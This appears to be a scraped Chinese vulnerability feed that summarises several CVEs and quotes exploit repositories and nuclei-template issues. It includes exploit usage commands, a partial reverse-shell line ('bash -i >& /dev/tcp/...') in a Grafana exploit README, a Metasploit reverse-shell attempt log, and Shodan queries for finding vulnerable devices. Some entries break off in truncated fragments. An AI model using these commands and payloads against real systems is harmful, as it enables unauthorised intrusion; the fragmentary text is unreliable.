entry.title: CVE-2025-6083
entry.content:
漏洞信息

漏洞名称： CVE-2025-6083

漏洞编号：

  • CVE： CVE-2025-6083

漏洞类型： 未授权访问

漏洞描述： 该漏洞允许攻击者无需认证即可访问目标系统，或通过Bearer Token和手动cookie进行认证后访问。

来源： https://github.com/Yuri08loveElaina/CVE_2025_6083

类型： CVE-2025:github search

仓库文件

  • Exploit.py
  • README.md

来源概述

  • Nếu không cần xác thực
    python3 exploit6083.py –url https://ztna.target.com –search admin
  • Dùng Bearer Token
    python3 exploit6083.py –url https://ztna.target.com –search admin –auth-token abcdef123456
  • Dùng cookie thủ công
    python3 exploit6083.py –url https://ztna.target.com –search admin –cookie “PHPSESSID=xyz; user=admin”

entry.title: Pulse Connect Secure Remote Code Execution Vulnerability
entry.content:
漏洞信息

漏洞名称： Pulse Connect Secure Remote Code Execution Vulnerability

漏洞编号：

  • CVE： CVE-2021-22893

漏洞类型： 命令执行

漏洞等级： 严重

漏洞描述： Pulse Connect Secure 9.1R11.4及以下版本存在未认证的远程代码执行漏洞。攻击者可利用路径遍历漏洞写入任意文件，通过上传webshell导致远程代码执行。此模板尝试写入JSP webshell，执行数学计算和’id’命令，并验证两者结果以确认RCE。

产品厂商： Pulse Secure

产品名称： Pulse Connect Secure

影响版本： version <= 9.1R11.4

来源： https://github.com/projectdiscovery/nuclei-templates/blob/44dc91ac6ae0df9a0866bbef4d8dbcbc1972d5dc/http%2Fcves%2F2021%2FCVE-2021-22893.yaml

类型： projectdiscovery/nuclei-templates:github issues

POC详情

entry.title: Windows NTLM反射SMB漏洞
entry.content:
漏洞信息

漏洞名称： Windows NTLM反射SMB漏洞

漏洞编号：

  • CVE： CVE-2025-33073

漏洞类型： 权限绕过

漏洞等级： 高危

漏洞描述： CVE-2025-33073是一个影响Windows系统的NTLM反射SMB漏洞，攻击者可以利用此漏洞通过反射NTLM认证挑战来绕过认证，未经授权访问敏感数据或资源。此漏洞源于对认证请求的不当处理，允许攻击者将NTLM认证挑战反射回目标。该漏洞的严重性被评估为高危，影响多种Windows版本。此存储库提供了一个概念验证(PoC)利用代码，旨在教育和提高对此安全问题的认识。

产品厂商： Microsoft

产品名称： Windows

来源： https://github.com/joaozixx/CVE-2025-33073

类型： CVE-2025:github search

仓库文件

  • CVE-2025-33073.py
  • README.md
  • dnstool.py
  • lib

来源概述

CVE-2025-33073: PoC Exploit for NTLM Reflection SMB Flaw 🚨

Table of Contents

  1. Introduction
  2. Overview of the Vulnerability
  3. Exploit Details
  4. Installation
  5. Usage
  6. Download the Exploit
  7. Contributing
  8. License
  9. Acknowledgments

Introduction

Welcome to the CVE-2025-33073 repository. This project provides a proof-of-concept (PoC) exploit for the NTLM reflection flaw in SMB. This vulnerability can allow an attacker to gain unauthorized access to sensitive information. The purpose of this repository is to educate and raise awareness about this security issue.

Overview of the Vulnerability

The NTLM reflection flaw in SMB is a serious security issue that affects various versions of Windows. Attackers can exploit this vulnerability to authenticate as any user, potentially gaining access to sensitive data or resources. This flaw arises from improper handling of authentication requests, allowing attackers to reflect NTLM authentication challenges back to the target.

Key Points:

  • Affected Systems: Various Windows versions
  • Impact: Unauthorized access to resources
  • Severity: High

Understanding this vulnerability is crucial for system administrators and security professionals to protect their networks effectively.

Exploit Details

The exploit targets the NTLM reflection flaw by leveraging specific characteristics of the SMB protocol. By sending crafted requests, the exploit can trigger the vulnerability, allowing an attacker to authenticate without proper credentials.

Technical Breakdown:

  • Protocol: SMB (Server Message Block)
  • Vulnerability Type: NTLM Reflection
  • Required Privileges: None

This exploit serves as a demonstration of the vulnerability and is intended for educational purposes only. Use it responsibly and ethically.

Installation

To set up the exploit on your machine, follow these steps:

  1. Clone the Repository:

  2. Navigate to the Directory:

  3. Install Dependencies:
    Ensure you have the required dependencies installed. Use the following command:

Usage

Once the exploit is set up, you can use it to test for the NTLM reflection flaw. Follow these steps:

  1. Run the Exploit:
    Execute the script with the target IP address:

  2. Monitor the Output:
    The exploit will provide feedback on the success or failure of the attempt.

  3. Log Results:
    It’s essential to log the results for further analysis.

Important Note:

Use this exploit only in a controlled environment where you have permission to test. Unauthorized use may lead to legal consequences.

Download the Exploit

You can download the latest version of the exploit from the Releases section. Please ensure you download the correct file and execute it in a safe environment.

To view the releases, click the button below:

Contributing

Contributions are welcome! If you would like to contribute to this project, please follow these steps:

  1. Fork the Repository: Click the “Fork” button at the top right corner of the page.
  2. Create a New Branch:
  3. Make Your Changes: Implement your changes and test them thoroughly.
  4. Commit Your Changes:
  5. Push to Your Branch:
  6. Create a Pull Request: Go to the original repository and click on “New Pull Request.”

Thank you for considering contributing to this project!

License

This project is licensed under the MIT License. See the LICENSE file for more details.

Acknowledgments

We would like to thank the security community for their ongoing efforts in identifying and addressing vulnerabilities. Special thanks to those who have contributed to the understanding of NTLM reflection flaws and their implications.

For more information, visit the Releases section to download the latest files and updates.

Feel free to reach out if you have any questions or need assistance with the exploit. Your feedback is valuable in improving this project.

entry.title: QTS & QuTS Command Injection Vulnerability
entry.content:
漏洞信息

漏洞名称： QTS & QuTS Command Injection Vulnerability

漏洞编号：

  • CVE： CVE-2020-2509

漏洞类型： 命令执行

漏洞等级： 严重

漏洞描述： QTS和QuTS hero因应用程序中的输入处理不当而包含命令注入漏洞，允许攻击者执行任意命令。攻击者需要发送特制的输入来利用此漏洞。

产品厂商： QNAP

产品名称： QTS & QuTS hero

搜索语法： product:”qnap”

来源： https://github.com/projectdiscovery/nuclei-templates/issues/12355

类型： projectdiscovery/nuclei-templates:github issues

来源概述

Description:

QTS and QuTS hero contain a command injection caused by improper input handling in the application, letting attackers execute arbitrary commands, exploit requires attacker to send crafted input.

Severity: Critical
POC:
  • https://github.com/jbaines-r7/overkill
  • https://vulncheck.com/xdb/533b5e83b1eb
  • https///github.com:jbaines-r7/overkill.git

KEV: True

Shodan Query: product:"qnap"

Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(-debug) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file.

Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.

You can check the FAQ for the Nuclei Templates Community Rewards Program here.

entry.title: Grafana 远程代码执行漏洞
entry.content:
漏洞信息

漏洞名称： Grafana 远程代码执行漏洞

漏洞编号：

  • CVE： CVE-2024-9264

漏洞类型： 命令执行

漏洞等级： 严重

漏洞描述： CVE-2024-9264是Grafana中的一个严重远程代码执行漏洞，通过SQL表达式和DuckDB利用。此漏洞允许攻击者在易受攻击的Grafana实例上执行任意代码。修复版本解决了原始PoC中的语法错误和write_file()函数的不正确使用问题，并成功通过shellfs扩展写入和执行反向shell。

产品厂商： Grafana

产品名称： Grafana

影响版本： 11.0.0

来源： https://github.com/Exerrdev/CVE-2024-9264-Fixed

类型： CVE-2024:github search

仓库文件

  • README.md
  • fpoc.py

来源概述

🛠️ CVE-2024-9264 - Fixed Grafana RCE Exploit

This is a fixed version of the proof-of-concept exploit for CVE-2024-9264, a critical remote code execution vulnerability in Grafana (via SQL expressions and DuckDB).

🔗 Original advisory: Grafana Security Release
❌ Original PoC: Broken due to syntax errors and incorrect use of write_file()
✅ This version works, tested on a vulnerable Grafana 11.0.0 instance.

✅ Fixes in this version

  • ✅ Correctly uses writefile() instead of write_file() (DuckDB function)
  • ✅ Proper shell payload using bash -i >& /dev/tcp/...
  • ✅ Reverse shell written and executed successfully via shellfs extension

📦 Requirements

  • Grafana instance with:
    • DuckDB backend
    • Ability to install shellfs from community
  • A netcat listener on your attacker machine

🚀 Usage

Then listen with:

⚠️ Legal Disclaimer

This project is for educational purposes only.
Do not use it against targets you do not have permission to test.

✍️ Author of this Fix

Modified and validated by Exerr — original PoC by z3k0sec.

漏洞信息

漏洞名称： Grafana 远程代码执行漏洞

漏洞编号：</

entry.title: Microsoft SMBv3 远程代码执行漏洞
entry.content:
漏洞信息

漏洞名称： Microsoft SMBv3 远程代码执行漏洞

漏洞编号：

  • CVE： CVE-2020-0796

漏洞类型： 缓冲区溢出

漏洞等级： 严重

漏洞描述： Microsoft Server Message Block 3.1.1 (SMBv3) 在处理某些请求时存在漏洞，远程攻击者可以通过网络访问SMBv3服务执行任意代码。

产品厂商： Microsoft

产品名称： Microsoft Server Message Block 3.1.1 (SMBv3)

搜索语法： cpe:”cpe:2.3:o:microsoft:windows_10_1903”

来源： https://github.com/projectdiscovery/nuclei-templates/issues/12271

类型： projectdiscovery/nuclei-templates:github issues

来源概述

Description:

Microsoft Server Message Block 3.1.1 (SMBv3) contains a remote code execution caused by mishandling of certain requests in the SMBv3 protocol, letting remote attackers execute arbitrary code, exploit requires network access to SMBv3 service.

Severity: Critical
POC:
  • http://packetstormsecurity.com/files/156732/Microsoft-Windows-SMB-3.1.1-Remote-Code-Execution.html

Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(-debug) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file.

Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.

You can check the FAQ for the Nuclei Templates Community Rewards Program here.

entry.title: PHP FPM 远程代码执行漏洞
entry.content:
漏洞信息

漏洞名称： PHP FPM 远程代码执行漏洞

漏洞类型： 命令执行

漏洞等级： 高危

漏洞描述： 该漏洞存在于PHP FPM中，攻击者可以通过构造特定的请求，利用Metasploit框架中的exploit/multi/http/php_fpm_rce模块实现远程代码执行。由于新的PHP编码器”HEX”导致payload大小超出限制，使得该漏洞在当前Metasploit版本中不再有效。

产品厂商： PHP

产品名称： PHP FPM

影响版本： 7.2.19

来源： https://github.com/rapid7/metasploit-framework/issues/20310

类型： rapid7/metasploit-framework:github issues

来源概述

Steps to reproduce

How’d you do it?

  1. Victim: PHP 7.2.19, on Nginx 1.14.2 with FPM
  2. Attacker: Metasploit Framework v6.4.45-dev, using module exploit/multi/http/php_fpm_rce

-> Exploit worked reliable on older Metasploit versions

Expected behavior

Default settings, default target (PHP), default payload (meterpreter/reverse_tcp)
During check phase, the max payload length is determined being 1760 bytes
Payload gets sent and a meterpreter shell is opened

Current behavior

During check phase, max payload length is determined being 1760 bytes
Then payload is prepared and encoded via the new default PHP encoder “HEX”, which is larger (2270 bytes), making the exploit fail

Metasploit version

v6.4.45-dev

Additional Information

Output:

msf6 exploit(multi/http/php_fpm_rce) > run
[*] Started reverse TCP handler on 10.11.14.240:4444
[*] Sending baseline query…
[*] Detecting QSL…
[+] The target is probably vulnerable. Possible QSLs: [1765]
[*] Doing sanity check…
[*] Detecting attack parameters…
[+] Parameters found: QSL=1760, customh_length=31
[+] Target is vulnerable!
[*] Performing attack using php.ini settings…
[+] Success! Was able to execute a command by appending ‘which which’
[*] Trying to cleanup /tmp/y…
[+] Cleanup done!
[*] Sending payload…
[-] Exploit aborted due to failure: unknown: QSL value too small to fit the command: QSL=1760, qsl_delta=0, prefix (size=2270)=W=php%20-r%20%22eval(hex2bin(%%22));%22%26
[*] Exploit completed, but no session was created.
entry.summary:
漏洞信息

漏洞名称： PHP FPM 远程代码执行漏洞

漏洞类型：</

entry.title: QNAP Photo Station 路径遍历漏洞
entry.content:
漏洞信息

漏洞名称： QNAP Photo Station 路径遍历漏洞

漏洞编号：

  • CVE： CVE-2019-7194

漏洞类型： 目录遍历

漏洞等级： 严重

漏洞描述： QNAP Photo Station 存在外部控制文件名或路径的问题，原因是验证不足，允许远程攻击者访问或修改系统文件，利用需要远程网络访问。

产品厂商： QNAP

产品名称： Photo Station

搜索语法： content-length: 580 “http server 1.0”

来源： https://github.com/projectdiscovery/nuclei-templates/issues/12254

类型： projectdiscovery/nuclei-templates:github issues

来源概述

Description:

QNAP Photo Station contains an external control of file name or path caused by insufficient validation, letting remote attackers access or modify system files, exploit requires remote network access.

Severity: Critical
POC:
  • http://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-Command-Execution.html

KEV: True

Shodan Query: content-length: 580 "http server 1.0"

Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(-debug) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file.

Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.

You can check the FAQ for the Nuclei Templates Community Rewards Program here.
